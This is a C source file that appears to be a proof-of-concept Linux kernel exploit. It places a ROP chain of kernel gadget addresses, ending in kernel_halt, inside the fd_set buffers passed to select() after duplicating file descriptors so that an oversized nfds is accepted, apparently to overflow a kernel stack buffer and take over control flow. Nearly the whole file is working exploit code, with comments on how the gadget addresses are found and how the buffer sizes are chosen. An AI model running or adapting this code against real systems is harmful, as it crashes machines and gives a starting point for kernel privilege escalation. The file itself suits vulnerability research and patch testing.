#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/select.h>
#include <unistd.h>

// objdump -d vmlinux > out
// grep -A 10 '<srso_alias_safe_ret>:' out | grep -P '\tret'
#define ret 0xffffffff82104109
// grep '<kernel_halt>:' out
#define kernel_halt 0xffffffff810bc430

int main(void) {
    // The stack kernel structure is 256 bytes
    // Half is used for the out fds, so 128 bytes remain.
    // These 128 bytes are shared by 3 sets, 128/3=42.5.
    // The next multiple of 8 (long used for the set structure) is 40.
    // So 40 byte is the maximum size of the sets we can use.
    const int set_size = 40;
    int nfds = set_size * 8; // multiplied here because nfds is in bits

    unsigned char chain[3 * set_size];
    memset(chain, 0x41, sizeof(chain));

    // FIXME: uncomment for marker
    /* ((long long *)buf)[0] = 0xdeadbeefdeadbeef; */

    // A few rets so that the rop chain is easier to hit
    // NOTE: 15 (8-byte) addresses are the maximum size of the chain (120 byte)
    ((long long *)chain)[0] = ret;
    ((long long *)chain)[1] = ret;
    ((long long *)chain)[2] = ret;
    ((long long *)chain)[3] = ret;
    ((long long *)chain)[4] = ret;
    ((long long *)chain)[5] = ret;
    ((long long *)chain)[6] = ret;
    ((long long *)chain)[7] = ret;
    ((long long *)chain)[8] = ret;
    ((long long *)chain)[9] = ret;
    ((long long *)chain)[10] = ret;
    ((long long *)chain)[11] = ret;
    ((long long *)chain)[12] = ret;
    ((long long *)chain)[13] = ret;
    ((long long *)chain)[14] = kernel_halt;

    // Clone a few fds so we can actually use nfds many.
    // (Otherwise max_fds is 256 in the kernel and if (n > max_fds) n =
    // max_fds;)
    for (int i = 0; i < 512; i++) {
        int fd = fcntl(0, F_DUPFD, i);
        if (fd < 0) {
            perror("fcntl");
            return 1;
        }
        close(fd);
    }

    // Call select with payload (split over the sets)
    int res = select(nfds, (fd_set *)(chain + 0 * set_size),
                     (fd_set *)(chain + 1 * set_size),
                     (fd_set *)(chain + 2 * set_size), 0);
    if (res == -1) {
        perror("select");
        return 1;
    }
    printf("select returned %d\n", res);
    return 0;
}
